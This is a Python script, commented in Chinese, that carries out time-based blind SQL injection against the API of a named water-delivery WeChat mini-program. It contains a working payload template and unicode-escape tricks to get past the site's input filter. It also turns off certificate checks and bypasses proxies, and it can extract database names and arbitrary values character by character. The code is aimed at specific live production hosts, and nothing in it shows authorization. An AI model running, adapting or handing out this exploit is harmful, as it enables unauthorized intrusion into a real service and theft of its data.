# -*- coding: utf-8 -*-
"""
送水猫微信小程序 · 时间盲注逐字符提取工具（带实时进度输出）

零依赖：只用 Python 标准库（urllib），无需 pip install。

用法：
    # —— 提取单个表达式 ——
    python blind_extract.py "database()"                       # 长度自动探测（推荐）
    python blind_extract.py "@@hostname" --fast --threads 6
    python blind_extract.py "database()" 15                    # 也可手动指定长度
    python blind_extract.py "database()" --host https://apijinzhou.songshuimao.com/
    python blind_extract.py "database()" -v                    # 打印每次二分探测

    # —— 查询实例内所有数据库（枚举）——
    python blind_extract.py --dbs                              # 一键枚举全部库名
    python blind_extract.py --dbs --fast --threads 6           # 快速并行
    python blind_extract.py --count "select count(*) from information_schema.schemata"
    python blind_extract.py --enum "(select schema_name from information_schema.schemata limit {k},1)" \
                           --count "select count(*) from information_schema.schemata"
    python blind_extract.py --enum "<模板>" --limit 20         # 不给条数：逐条枚举，遇空即停

    ⚠️ item 模板必须是「带括号的完整标量表达式」：子查询要自带一层括号，
       否则 length(select ...) / substring(select ...) 会因语法错误恒返回 0。

长度探测：省略 length 时，脚本先二分 `length(<expr>)` 自动定长
    （先探 length>64，超过则按 255 处理；再二分逼近，约 7 次请求）。

性能说明（为什么快）：
    1) 自适应采样：每步先发 1 次请求，若耗时明显落在「真」或「假」区间就直接采信，
       只有落在模糊区才补采样 —— 绝大多数步骤只发 1 次请求（原来固定 3 次）。
    2) 可选 --fast：把 sleep 降到 0.7s（真≈1.8s / 假≈0.4s，分离度仍 >4×），整体再快一倍。
    3) 可选 --threads N：各字符彼此独立，可并行提取（实测 6 线程约提速 4~5 倍）。
       注意：这会提高对目标站点的瞬时并发（默认 1，保持最小影响）。

载荷模板（不依赖 SQL 短路、不依赖任何表行，对含子查询的条件同样可靠）：
    x" or (select 1 from (select sleep(if(<COND>,SLEEP,0)))t)#

纪律：只读 SELECT + SLEEP 时延；不写入、不删改；仅用于读取数据库元数据。
"""
import argparse
import concurrent.futures
import ssl
import statistics
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

URL = "https://apianshan.songshuimao.com/api.php?m=goods.getListByFilter"
TPL = 'x" or (select 1 from (select sleep(if(%s,%.1f,0)))t)#'

# 枚举信息库（元数据）用到的两个固定表达式
# 注意：item 模板必须是「带括号的完整标量表达式」——length(select ...) 是语法错误，
#       必须写成 length((select ...))，所以模板本身自带一层括号。
SCHEMATA_COUNT = "select count(*) from information_schema.schemata"
SCHEMATA_ITEM = "(select schema_name from information_schema.schemata limit {k},1)"

_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
_TLS = threading.local()


def _opener():
    """每个线程一个 opener（线程安全）。"""
    op = getattr(_TLS, "opener", None)
    if op is None:
        op = urllib.request.build_opener(
            urllib.request.ProxyHandler({}),      # 绕开环境代理
            urllib.request.HTTPSHandler(context=_ctx),
        )
        _TLS.opener = op
    return op


def esc(s: str) -> str:
    """把会被前置黑名单拦截的字符转成 JSON \\uXXXX 转义（JSON 解析器会解码 -> 绕过）。

    注意：
      1) 反斜杠必须是「单个」。若变成 \\\\u0022，JSON 解析出的是字面 6 字符串，
         引号无法配平，注入失效（这也是手工复现最常踩的坑）。
      2) 必须覆盖模板自身的 `or ` 与 `current_user` 里的 `user`，否则原文残留
         ` or ` / `user` 仍会被过滤器拦截，返回「存在非法参数」。
    """
    return (s.replace('"', '\\u0022')
             .replace('(', '\\u0028')
             .replace(')', '\\u0029')
             .replace(',', '\\u002c')
             .replace('#', '\\u0023')
             .replace('from', '\\u0066rom')
             .replace('sleep', '\\u0073leep')
             .replace('or ', '\\u006fr ')
             .replace('user', '\\u0075ser'))


class Blind:
    def __init__(self, url=URL, sleep_s=1.5, samples=3, adaptive=True,
                 verbose=False, retries=2, timeout=40):
        self.url = url
        self.sleep_s = sleep_s
        self.samples = samples
        self.adaptive = adaptive
        self.verbose = verbose
        self.retries = retries
        self.timeout = timeout
        # 判定区间：真值 ≈ 2*sleep + 0.4（服务端对同一条件执行两次查询）；假值 ≈ 0.4
        self.true_est = 2 * sleep_s + 0.4
        self.threshold = self.true_est / 2 + 0.2
        self.hi = self.true_est * 0.7      # 明显为真
        self.lo = self.true_est * 0.35     # 明显为假
        self.n_requests = 0
        self._lock = threading.Lock()

    def _bump(self):
        with self._lock:
            self.n_requests += 1

    def _once(self, cond: str) -> float:
        value = esc(TPL % (cond, self.sleep_s))
        body = ('{"fields": [], "page": 1, "where": {"status": {"operation": "=", '
                '"value": "%s"}}}' % value)
        data = urllib.parse.urlencode({"filter": body}).encode()
        req = urllib.request.Request(
            self.url, data=data, method="POST",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) MicroMessenger/8.0.50",
                "Referer": self.url.split("api.php")[0],
            })
        last_err = None
        for attempt in range(self.retries + 1):
            t0 = time.time()
            try:
                with _opener().open(req, timeout=self.timeout) as r:
                    text = r.read().decode("utf-8", "replace")
                dt = time.time() - t0
                self._bump()
                if "存在非法参数" in text:
                    raise RuntimeError("载荷被前置过滤器拦截")
                return dt
            except Exception as e:            # noqa: BLE001
                last_err = e
                if attempt >= self.retries:
                    break
                time.sleep(0.5)
        raise RuntimeError(f"请求失败: {last_err}")

    def test(self, cond: str) -> bool:
        """返回条件是否为真。自适应：明确就早停。"""
        dts = []
        for i in range(self.samples):
            dts.append(self._once(cond))
            med = statistics.median(dts)
            if self.adaptive and (med >= self.hi or med <= self.lo):
                break
            if i + 1 < self.samples:
                time.sleep(0.15)
        med = statistics.median(dts)
        ok = med >= self.threshold
        if self.verbose:
            print(f"        probe {cond[:58]:<58} {med:5.2f}s -> {'真' if ok else '假'}"
                  f"  ({len(dts)} 次采样)")
        return ok

    def char_at(self, expr: str, pos: int):
        """ASCII 二分，返回 (码值, 二分步数)。"""
        lo, hi, steps = 0, 127, 0
        while lo < hi:
            mid = (lo + hi) // 2
            steps += 1
            if self.test("ascii(substring(%s,%d,1))>%d" % (expr, pos, mid)):
                lo = mid + 1
            else:
                hi = mid
        return lo, steps

    def length_of(self, expr: str, cap: int = 255) -> int:
        """二分探测 length(expr)。先探 >64，超长则按 cap 处理。"""
        hi = 64
        if self.test("length(%s)>64" % expr):
            hi = cap
        lo = 0
        steps = 1
        while lo < hi:
            mid = (lo + hi) // 2
            steps += 1
            if self.test("length(%s)>%d" % (expr, mid)):
                lo = mid + 1
            else:
                hi = mid
        if self.verbose:
            print(f"        length 探测: {steps} 步 -> {lo}")
        return lo

    def int_of(self, expr: str, cap: int = 4096) -> int:
        """二分求标量表达式 (expr) 的整数取值（用于 count(*) 之类）。"""
        hi = 1
        while hi < cap and self.test("(%s)>%d" % (expr, hi)):
            hi *= 2
        lo = 0
        while lo < hi:
            mid = (lo + hi) // 2
            if self.test("(%s)>%d" % (expr, mid)):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def enum(self, item_template: str, count_expr: str = None, limit: int = None,
             workers: int = 1, stop_on_empty: bool = True):
        """通用枚举。

        - 给了 count_expr：先二分求条数 n，再对 k=0..n-1 提取（可并行）。
        - 没给 count_expr：从 k=0 起逐条提取，遇空串即停（最多 limit 条，串行）。
        """
        if count_expr:
            n = self.int_of(count_expr)
            print(f"条数探测   : ({count_expr}) = {n}")
            if limit:
                n = min(n, limit)
                print(f"             取前 {n} 条（--limit）")
        else:
            n = limit or 32
            print(f"条数探测   : 未提供 --count，按最多 {n} 条逐条枚举，遇到空值提前停止")
            workers = 1                      # 需按序遇空即停，强制串行
        if n == 0:
            print("⚠️ 条数为 0，无可枚举内容。")
            return []

        def one(k):
            expr = item_template.format(k=k)
            length = self.length_of(expr)
            if length == 0:
                return k, expr, ""
            val = self.extract(expr, length, threads=1, quiet=True)
            return k, expr, val

        items = [None] * n
        if workers <= 1:
            for k in range(n):
                _, _, val = one(k)
                if val == "" and stop_on_empty:
                    print(f"  [{k}] 空值 -> 枚举结束（共 {k} 条）")
                    items = items[:k]
                    break
                items[k] = val
                print(f"  [{k+1}] {val}      (len={len(val)})")
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
                futs = [ex.submit(one, k) for k in range(n)]
                done = 0
                for fut in concurrent.futures.as_completed(futs):
                    k, _, val = fut.result()
                    items[k] = val
                    done += 1
                    print(f"  [完成 {done}/{n}] #{k} = {val!r}")
            if stop_on_empty:
                cut = next((i for i, v in enumerate(items) if v == ""), None)
                if cut is not None:
                    items = items[:cut]
                    print(f"  -> 第 {cut} 条为空，截断为 {len(items)} 条")
        return items

    def extract(self, expr: str, length: int, save_path: str = None, threads: int = 1,
                quiet: bool = False) -> str:
        if not quiet:
            print(f"目标表达式 : {expr}")
            print(f"目标地址   : {self.url}")
            print(f"长度       : {length}   模式: sleep={self.sleep_s}s, "
                  f"自适应采样={'开' if self.adaptive else '关'}, 最多 {self.samples} 次/步, "
                  f"并发 {threads}")
            print(f"判定区间   : 真 >= {self.hi:.2f}s / 假 <= {self.lo:.2f}s （阈值 {self.threshold:.2f}s）")
            print("-" * 96)

        chars = [None] * length
        t_start = time.time()
        done = 0

        def render():
            return "".join(c if c is not None else "?" for c in chars)

        def run(pos):
            t0 = time.time()
            code, steps = self.char_at(expr, pos)
            return pos, code, steps, time.time() - t0

        def record(pos, code, steps, used):
            nonlocal done
            chars[pos - 1] = chr(code) if 0 < code < 128 else "?"
            done += 1
            elapsed = time.time() - t_start
            eta = (elapsed / done) * (length - done)
            if not quiet:
                tag = f"[{done:>2}/{length}]" if threads <= 1 else f"[完成 {done:>2}/{length}]"
                print(f"{tag} 第 {pos:>2} 位 = {chars[pos-1]!r:<6} (0x{code:02x})  "
                      f"二分 {steps} 步  {used:5.1f}s   "
                      f"{'已得' if threads <= 1 else '当前'}: {render()}   ETA {eta:4.0f}s")
            if save_path:
                with open(save_path, "w", encoding="utf-8") as f:
                    f.write(render())

        if threads <= 1:
            for pos in range(1, length + 1):
                record(*run(pos))
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
                futs = [ex.submit(run, pos) for pos in range(1, length + 1)]
                for fut in concurrent.futures.as_completed(futs):
                    record(*fut.result())

        out = render()
        if not quiet:
            print("-" * 96)
            print(f"结果       : {out}")
        return out

    def verify(self, expr: str, value: str) -> bool:
        cond = "substring(%s,1,%d)=0x%s" % (expr, len(value), value.encode().hex())
        t0 = time.time()
        ok = self.test(cond)
        print(f"整串复核   : {cond}")
        print(f"             -> {'✅ 成立' if ok else '❌ 不成立'}  ({time.time()-t0:.1f}s)")
        return ok


def main():
    ap = argparse.ArgumentParser(description="时间盲注逐字符提取 / 枚举（带进度输出，零依赖）")
    ap.add_argument("expr", nargs="?", default=None,
                    help='目标表达式，如 "database()" / "@@hostname"')
    ap.add_argument("length", nargs="?", type=int, default=None,
                    help="长度；省略则自动二分探测 length(<expr>)")
    ap.add_argument("--host", default=URL, help="接口地址")
    ap.add_argument("--sleep", type=float, default=1.5, help="单次 sleep 秒数（默认 1.5）")
    ap.add_argument("--samples", type=int, default=3, help="每步最多采样次数（默认 3）")
    ap.add_argument("--fast", action="store_true", help="快速模式：sleep=0.7, 采样 1 次")
    ap.add_argument("--threads", type=int, default=1,
                    help="并行线程数（默认 1；建议 ≤6，注意目标站点负载）")
    ap.add_argument("-v", "--verbose", action="store_true", help="打印每次二分探测")
    ap.add_argument("--no-verify", action="store_true", help="跳过整串复核")
    ap.add_argument("--save", default=None, help="每取一字符就写盘（断点/防丢）")
    # ---- 枚举模式 ----
    ap.add_argument("--count", metavar="EXPR", default=None,
                    help='只求标量整数值，如 "select count(*) from information_schema.schemata"')
    ap.add_argument("--enum", metavar="ITEM_TPL", default=None,
                    help='枚举模式：模板里用 {k} 作序号，须为带括号的完整标量表达式，如 '
                         '"(select schema_name from information_schema.schemata limit {k},1)"')
    ap.add_argument("--dbs", action="store_true",
                    help="一键枚举实例内所有数据库名（= --enum schemata --count schemata）")
    ap.add_argument("--limit", type=int, default=None,
                    help="枚举条数上限；未给 --count 时作为最大尝试条数（默认 32）")
    a = ap.parse_args()

    sleep_s, samples = (0.7, 1) if a.fast else (a.sleep, a.samples)
    b = Blind(url=a.host, sleep_s=sleep_s, samples=samples, verbose=a.verbose)
    workers = max(1, a.threads)
    try:
        # 1) 一键枚举所有数据库
        if a.dbs:
            names = b.enum(SCHEMATA_ITEM, count_expr=SCHEMATA_COUNT,
                           limit=a.limit, workers=workers)
            print("-" * 96)
            print(f"共 {len(names)} 个数据库：")
            for i, nm in enumerate(names):
                print(f"  {i:>2}. {nm}")
            print(f"总请求数   : {b.n_requests}")
            return 0

        # 2) 通用枚举
        if a.enum:
            names = b.enum(a.enum, count_expr=a.count, limit=a.limit, workers=workers)
            print("-" * 96)
            for i, nm in enumerate(names):
                print(f"  {i:>2}. {nm}")
            print(f"总请求数   : {b.n_requests}")
            return 0

        # 3) 只求一个整数
        if a.count:
            t0 = time.time()
            v = b.int_of(a.count)
            print(f"({a.count}) = {v}   （{time.time()-t0:.1f}s，{b.n_requests} 次请求）")
            return 0

        # 4) 原有：提取单个表达式
        if not a.expr:
            ap.error("需要提供 expr，或改用 --dbs / --enum / --count")
        length = a.length
        if length is None:
            t0 = time.time()
            length = b.length_of(a.expr)
            print(f"自动探测长度 : length({a.expr}) = {length}   "
                  f"（{time.time()-t0:.1f}s，{b.n_requests} 次请求）")
            if length == 0:
                print("⚠️ 长度为 0 —— 表达式可能不存在、无权限，或该条件通道不可用。")
                return 2
        val = b.extract(a.expr, length, save_path=a.save, threads=workers)
        if not a.no_verify:
            b.verify(a.expr, val)
    except KeyboardInterrupt:
        print("\n已中断（--save 保存的进度可用于续跑）")
        return 1
    print(f"总请求数   : {b.n_requests}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
